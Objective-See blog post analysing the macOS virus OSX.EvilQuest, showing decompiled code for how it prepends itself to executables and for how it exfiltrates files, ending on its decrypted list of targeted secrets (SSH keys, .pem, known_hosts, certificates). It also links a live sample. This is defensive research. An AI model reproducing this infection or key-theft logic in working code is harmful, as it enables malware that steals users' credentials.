<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">
  <head>
    <meta charset="UTF-8">
    
    <title>Objective-See's Blog</title>
    
    <link rel="shortcut icon" href="../images/logoApple.ico">
    
    <link href="../css/style.css" rel="stylesheet" />
    <script src="../js/analytics.js"></script>
    <script src="../js/sweetalert.min.js"></script>
    <script src="../js/donationPopup.js"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>
    <script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>
    
    
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:image" content=https://objective-see.com/images/blog/blog_0x60/infect.png />
<meta name="twitter:title" content=OSX.EvilQuest&#32;Uncovered />
<meta name="twitter:description" content=part&#32;ii:&#32;insidious&#32;capabilities />
    
<meta property="og:type" content="article" />
<meta property="og:title" content=OSX.EvilQuest&#32;Uncovered />
<meta property="og:image" content=https://objective-see.com/images/blog/blog_0x60/infect.png />

    </head>
    <body>

    <link rel="stylesheet" type="text/css" href="/css/menu.css">

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<nav role="main" style="padding-bottom:30px;">
<ul>
    
    <li>
    <div class="logo">
        <a href="/index.html">
            <figure class="logo">
                <img src="/images/logoApple.png" style="height:75px; width:75px;" />
                <br>
                <figcaption class="logo">
                    <span style="color: #95c02d;">Objective</span><span style="color: #798992;">-See</span>
                 
                    <div style="color: #798992; font-size: 18px; font-weight: 300; padding-left: 3px; margin-top: -2px;">
                     a non-profit 501(c)(3) foundation.
                    </div>
                
                </figcaption>
            </figure>
        </a>
    </div>
    </li>

    
    <li>  
        <div class="menuicon">
        <div style="position: relative; min-width:0px;">
        <input type="checkbox" class="toggler">
        <div class="hamburger"><div></div></div>
        <div class="menu">
        <div style="padding-right: 20px;">
            <ul>

                <li>
                    <a href="/news.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/newsIcon.png" height="24px;">
                        <span style="vertical-align:middle">News</span>
                    </a>
                </li>

                <li>
                    <a href="https://objective-see.myshopify.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/storeIcon.png" height="24px;">
                        <span style="vertical-align:middle">Swag</span>
                    </a>
                </li>

                <li>
                    <a href="https://taomm.org/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/bookIcon.png" height="24px;">
                        <span style="vertical-align:middle">Books</span>
                    </a>
                </li>

                <li>
                    <a href="https://objectivebythesea.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/conferenceIcon.png" height="24px;">
                        <span style="vertical-align:middle">Conference</span>
                    </a>
                </li>

                 <li>
                    <a href="/malware.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/malwareIcon.png" height="24px;">
                        <span style="vertical-align:middle">Malware Collection</span>
                    </a>
                </li>

                <li style="border-bottom: none;">
                    <a href="/about.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/aboutIcon.png" height="24px;">
                        <span style="vertical-align:middle">About Objective-See</span>
                    </a>
                </li>

            </ul>
        </div>
    </div>
    </div>
    </div>

    </li>

    
    <li>
        <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button">Support Us!</button>
        </form>
    </li>

    
    <li>
        <a href="/blog.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/blogIcon.png" class="item"/>
                <figcaption class="item">blog</figcaption>
            </center>
        </figure>
        </a>
    </li>
    
    
    <li>
        <a href="/products.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/productsIcon.png" class="item"/>
            </center>
            <figcaption class="item">tools</figcaption>
        </figure>
        </a>
    </li>

</ul>

<hr class="gradient">

</nav>
    
    <div class="pageContent">
      <br>
      
<section class="blogContent" style="padding-bottom:50px";>
  <div class="blogTitle">OSX.EvilQuest Uncovered</div>
  <div class="blogSubTitle">part ii: insidious capabilities</div>
  <div class="blogDate" style="padding-top:10px;">by: Patrick Wardle / July 3, 2020</div>
  <div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; margin-bottom: 15px; font-size: 15px;">
    <span class="n3rdFont">
    Our research, tools, and writing, are supported by the "Friends of Objective-See" such as:
    <br>
    <table border="0" style="width:100%; border: none">
    <tr style="width:100%;">
    <td style="padding: 0px; border: none" border="0" align="center">
      <a href="https://www.airoav.com/" style="text-decoration: none;">
      <img src="../images/friends/airo.png" height="100px;" style="display:block;  margin:auto; padding-top: 0px;"/>
      Airo AV
      </a>
    </td>
    </tr>
    </table>
    <br>
    <div align="right" style="padding-right:10px; padding-bottom:10px;">
        <a href="https://objective-see.com/friends.html" class="inlineLink">Become a Friend!</a>
    </div>
  </span>
</div>
<br>
<br>
<div class="note">
&#x1F4DD; &#x1F47E; Want to play along?
<p>I&rsquo;ve added the <a href="https://objective-see.com/downloads/malware/EvilQuest.zip">sample</a> (&lsquo;OSX.EvilQuest&rsquo;) to our malware collection (password: infect3d)</p>
<p>&hellip;please don&rsquo;t infect yourself!</p>
</div>
<h3 id="background">Background</h3>
<p>In <a href="blog_0x59.html">part one</a> of this blog post series, we detailed the infection vector, persistence, and anti-analysis logic of <code>OSX.EvilQuest</code>.</p>
<p>Though initially though to be a rather mundane piece of ransomware, further analysis revealed something far more powerful and insidious. In this post, we detail the malware&rsquo;s viral actions, as well as detail its full capabilities (ransomware logic included).</p>
<h3 id="viral-infection">Viral Infection</h3>
<p><a href="https://en.wikipedia.org/wiki/Computer_virus">Wikipedia defines</a> a computer virus as:</p>
<blockquote>
<p>&ldquo;<i>A computer virus is a type of computer program that, when executed, replicates itself by modifying other computer programs and inserting its own code.</i>&rdquo;</p>
</blockquote>
<p>The reality is most (all?) recent macOS malware specimens are not computer viruses (by the standard definition), as they don&rsquo;t seek to locally replicate themselves. However <code>OSX.EvilQuest</code> does &hellip;making it a true macOS computer virus!! üòç</p>
<p>Recall in <a href="blog_0x59.html">part one</a> we noted that:</p>
<blockquote>
<p>&ldquo;<i>&hellip;the malware invokes a method named <code>extract_ei</code>, which attempts to read &hellip; <code>trailer</code> data from the end of itself. However, as a function named <code>unpack_trailer</code> (invoked by <code>extract_ei</code>) returns 0 (false) &hellip;it appears that this sample does not contain the required <code>trailer</code> data.</i>&rdquo;</p>
</blockquote>
<p>At that time, I was not sure what this <code>trailer</code> data was &hellip;as the initial malware binary did not contain such data. But, continued analysis gave use the answer.</p>
<p>Once the initial malware binary has persisted, it invokes a method named <code>ei_loader_main</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">_ei_loader_main</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv, <span style="color:#66d9ef">int</span> euid, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> home) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    <span style="color:#75715e">//decrypts to &#34;/Users&#34;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(var_30 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">=</span> _ei_str(<span style="color:#e6db74">&#34;26aC391KprmW0000013&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    <span style="color:#75715e">//create new thread
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#75715e"></span>    <span style="color:#75715e">// execution starts at `_ei_loader_thread` 
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#75715e"></span>    rax <span style="color:#f92672">=</span> pthread_create(<span style="color:#f92672">&amp;</span>var_28, <span style="color:#ae81ff">0x0</span>, _ei_loader_thread, var_30);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    <span style="color:#66d9ef">return</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>}</span></span></code></pre></div>
<p>This function decrypts a string (&quot;<code>/Users</code>&quot;), then invokes <code>pthread_create</code> to spawn a new background thread with the start routine set to the <code>ei_loader_thread</code> function.</p>
<p>This thread function simply invokes a function named <code>get_targets</code>, passing in a callback function named <code>is_executable</code>. Then, for each &rsquo;target&rsquo; invokes a function named <code>append_ei</code>:</p>
<img src="../images/blog/blog_0x60/infect.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">_ei_loader_thread</span>(<span style="color:#66d9ef">int</span> arg) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    var_10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    var_14 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    count <span style="color:#f92672">=</span>  <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    rax <span style="color:#f92672">=</span> get_targets(<span style="color:#f92672">*</span>(arg <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>), <span style="color:#f92672">&amp;</span>var_10, <span style="color:#f92672">&amp;</span>var_14, is_executable);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>        <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; i <span style="color:#f92672">&lt;</span> var_14; i<span style="color:#f92672">++</span>) 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>        {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>                <span style="color:#66d9ef">if</span> (append_ei(<span style="color:#f92672">*</span>var_8, <span style="color:#f92672">*</span>(var_10 <span style="color:#f92672">+</span> (sign_extend_64(var_20) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0x4</span>))) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>                        var_24 <span style="color:#f92672">=</span> count <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>                }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>                <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>                        var_24 <span style="color:#f92672">=</span> count;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>                }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>                count <span style="color:#f92672">=</span> var_24;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>        }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>    <span style="color:#66d9ef">return</span> count;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>}</span></span></code></pre></div>
<p>Here, we briefly describe these function, and their role in locally propagating the malware (virus):</p>
<ul>
<li>
<p><code>get_targets</code> (address: <code>0x000000010000E0D0</code>):
<br>
Given a root directory (i.e. <code>/Users</code>) the <code>get_targets</code> function invokes the <code>opendir</code> and <code>readdir</code> APIs in order to recursively generate a listing of files. However, for each file encountered, the callback function (i.e. <code>is_executable</code>) is applied to see if the file is of interest. (Note that elsewhere in the code, the <code>get_targets</code> is invoked, albeit with a different filter callback).</p>
</li>
<li>
<p><code>is_executable</code> (address: <code>0x0000000100004AC0</code>):
<br>
The callback (filter) function is invoked with a path to a file, and check if its executable (i.e. a candidate for infection).</p>
</li>
</ul>
<p>More specifically, it first checks (via <code>strstr</code>) if the path contains <code>.app/</code>, and if it does, the function returns with 0x0.
<br>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>__text:<span style="color:#ae81ff">0000000100004</span>ACC                 mov     rdi, [rbp<span style="color:#f92672">+</span>file]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>__text:<span style="color:#ae81ff">0000000100004</span>AD0                 lea     rsi, aApp       ; <span style="color:#e6db74">&#34;.app/&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>__text:<span style="color:#ae81ff">0000000100004</span>AD7                 call    _strstr
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>__text:<span style="color:#ae81ff">0000000100004</span>ADC                 cmp     rax, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>__text:<span style="color:#ae81ff">0000000100004</span>AE0                 jz      <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>__text:<span style="color:#ae81ff">0000000100004</span>AE6                 mov     [rbp<span style="color:#f92672">+</span>var_4], <span style="color:#ae81ff">0</span> 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>__text:<span style="color:#ae81ff">0000000100004</span>AED                 jmp     leave</span></span></code></pre></div>
Assuming the file is not (within) an application bundle, it examines the file&rsquo;s header looking for various binary magic numbers (i.e. <code>MH_MAGIC_64</code>, etc.):
<br>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">if</span> ((((var_40 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xfeedface</span>) <span style="color:#f92672">&amp;&amp;</span> (var_40 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xcefaedfe</span>)) <span style="color:#f92672">&amp;&amp;</span> 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>      (var_40 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xfeedfacf</span>)) <span style="color:#f92672">&amp;&amp;</span> (var_40 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xcffaedfe</span>)) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>            <span style="color:#75715e">//not an executable!
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span><span style="color:#75715e"></span>}</span></span></code></pre></div></p>
<ul>
<li><code>append_ei</code> (address: <code>0x0000000100004BF0</code>):
<br>
This is the actual viral infection function, that takes a path to the malware&rsquo;s binary image (i.e. <code>/Library/mixednkey/toolroomd</code>) and a path to a target executable binary to infect.
<br>
<br>
To infect the target, the malware first opens and reads in both the contents of the source and target files. It then writes the contents of the source file (the malware) to the start of the target file, while (re)writing the original target bytes to the end of the file. It then writes a trailer to the end of the file. The trailer includes an infection marker (<code>DEADFACE</code>) and the offset in the (now) infected file where the original target&rsquo;s bytes are.</li>
</ul>
<p>Once an executable file is infected, since the malware has wholly inserted itself at the start of the file, whenever the file is subsequently executed, the malware will be executed first!</p>
<p>Of course to ensure nothing is amiss, the contents of the original file should be run as well &hellip;and the malware indeed ensures this occurs.</p>
<p>Recall that when the malicious code is executed, it invokes the <code>extract_ei</code> function on its own binary image, to check if the file is infected. If so, it opens itself, and reads the trailer to get the offset of where the file&rsquo;s original bytes are located. It then writes these bytes out to a new file named: <code>.&lt;orginalfilename&gt;1</code>. This file is then set executable (via <code>chmod</code>) and executed (<code>via execl</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>__text:<span style="color:#ae81ff">00000001000055</span>DA                 mov     rdi, [rbp<span style="color:#f92672">+</span>newFile]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>__text:<span style="color:#ae81ff">00000001000055E1</span>                 movzx   esi, [rbp<span style="color:#f92672">+</span>var_BC]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>__text:<span style="color:#ae81ff">00000001000055E8</span>                 call    _chmod
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>__text:<span style="color:#ae81ff">00000001000055</span>ED                 xor     esi, esi        
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>__text:<span style="color:#ae81ff">00000001000055</span>EF                 mov     rdi, [rbp<span style="color:#f92672">+</span>newFile]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>__text:<span style="color:#ae81ff">00000001000055F</span><span style="color:#ae81ff">6</span>                 mov     [rbp<span style="color:#f92672">+</span>var_158], eax
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>__text:<span style="color:#ae81ff">00000001000055F</span>C                 mov     al, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>__text:<span style="color:#ae81ff">00000001000055F</span>E                 call    _execl</span></span></code></pre></div>
<p>We can observe the execution of the &ldquo;restored&rdquo; file via a process monitor &hellip;which originally was a file placed on the desktop called <code>infectME</code> (and thus the malware renames <code>.infectME1</code> to execute):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

# ~/Desktop/ProcInfo

starting process monitor
process monitor enabled...

[process start]
pid: 1380
path: /Users/user/Desktop/infectME
user: 501

...

[process start]
pid: 1380
path: /Users/user/Desktop/.infectME1
user: 501

</pre>
</div>
<p>Uncovering and understanding the viral infection routine means two things:</p>
<ol>
<li>
<p>Simply removing the malware&rsquo;s launch item(s) and binaries is not enough to disinfect a system. If you&rsquo;re infected, best to wipe and re-install macOS!</p>
</li>
<li>
<p>One could trivially write a disinfector to restore infected files, by:
<br>
a. Scanning for infected files (infection marker <code>DEADFACE</code>)
<br>
b. Parse the trailer to find the offset of the file&rsquo;s original bytes
<br>
c. Remove everything before this offset (i.e. the malware&rsquo;s code)</p>
</li>
</ol>
<h3 id="file-exfiltration">File Exfiltration</h3>
<p>One of the main capabilities of this virus, is the stealthy exfiltration of files that match certain regular expressions.</p>
<p>In the <code>main</code> function, the malware spawns off a background thread to execute a function named <code>ei_forensic_thread</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>rax <span style="color:#f92672">=</span> pthread_create(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">thread</span>, <span style="color:#ae81ff">0x0</span>, _ei_forensic_thread, <span style="color:#f92672">&amp;</span>args);</span></span></code></pre></div>
<p>The <code>_ei_forensic_thread</code> first connects to <code>andrewka6.pythonanywhere.com</code> to read a remote file (<code>ret.txt</code>), that contained the address of the remote command and control server.
Then, it invokes a function named <code>lfsc_dirlist</code> with a parameter of <code>/Users</code>. As its name suggests, the <code>lfsc_dirlist</code> performs a recursive directory listing, returning the list:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

$ lldb /Library/mixednkey/toolroomd

...
(lldb) b 0x000000010000171E
Breakpoint 1: where = toolroomd`toolroomd[0x000000010000171e], address = 0x000000010000171e

(lldb) c

* thread #4, stop reason = breakpoint 1.1
    frame #0: 0x000000010000171e toolroomd
->  0x10000171e: callq  0x100002dd0

(lldb) ni

(lldb) x/s $rax

0x10080bc00: "/Users/user\n/Users/Shared\n/Users/user/Music\n/Users/user/.lldb\n/Users/user/Pictures\n/Users/user/Desktop\n/Users/user/Library\n/Users/user/.bash_sessions\n/Users/user/Public\n/Users/user/Movies\n/Users/user/.Trash\n/Users/user/Documents\n/Users/user/Downloads\n/Users/Shared/adi\n/Users/user/Library/Application Support\n/Users/user/Library/Maps\n/Users/user/Library/Assistant\n/Users/user/Library/Saved Application State\n/Users/user/Library/IdentityServices\n/Users/user/Library/WebKit\n/Users/user/Library/Calendars\n/Users/user/Library/Preferences\n/Users/user/Library/studentd\n/Users/user/Library/Messages\n/Users/user/Library/HomeKit\n/Users/user/Library/Keychains\n/Users/user/Library/Sharing\n..."

</pre>
</div>
<p>This directory listing is then sent to the attacker&rsquo;s remote command and control server, via call to the malware <code>ei_forensic_sendfile</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>__text:<span style="color:#ae81ff">0000000100001</span><span style="color:#ae81ff">87</span>A                 mov     rdi, [rbp<span style="color:#f92672">+</span>mediator]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>__text:<span style="color:#ae81ff">0000000100001</span><span style="color:#ae81ff">87</span>E                 mov     rsi, [rbp<span style="color:#f92672">+</span>var_58]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>__text:<span style="color:#ae81ff">0000000100001</span><span style="color:#ae81ff">882</span>                 mov     rdx, [rbp<span style="color:#f92672">+</span>directoryList]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>__text:<span style="color:#ae81ff">0000000100001</span><span style="color:#ae81ff">886</span>                 mov     rax, [rbp<span style="color:#f92672">+</span>var_58]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>__text:<span style="color:#ae81ff">0000000100001</span><span style="color:#ae81ff">88</span>A                 mov     rcx, [rax<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>__text:<span style="color:#ae81ff">0000000100001</span><span style="color:#ae81ff">88</span>E                 call    _ei_forensic_sendfile</span></span></code></pre></div>
<p>The malware then invokes the <code>get_targets</code> function (which we discussed earlier), however this time it passes in the <code>is_lfsc_target</code> callback filter function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>rax <span style="color:#f92672">=</span> get_targets(rax, <span style="color:#f92672">&amp;</span>var_18, <span style="color:#f92672">&amp;</span>var_1C, is_lfsc_target);</span></span></code></pre></div>
<p>As the <code>get_targets</code> function is enumerating the user&rsquo;s files, the <code>is_lfsc_target</code> function is called to determine if files are of interest. Specifically the <code>is_lfsc_target</code> function invokes two helper functions, <code>lfsc_parse_template</code> and <code>is_lfsc_target</code> to classify files. In a debugger, we can ascertain the address of the match constraints (<code>0x0000000100010A95</code>), and then match that in the dump of the strings we decrypted (in <a href="blog_0x59.html">part one</a> of this blog post series):</p>
<pre tabindex="0"><code>(0x10eb67a95): *id_rsa*/i
(0x10eb67ab5): *.pem/i
(0x10eb67ad5): *.ppk/i
(0x10eb67af5): known_hosts/i
(0x10eb67b15): *.ca-bundle/i
(0x10eb67b35): *.crt/i
(0x10eb67b55): *.p7!/i
(0x10eb67b75): *.!er/i
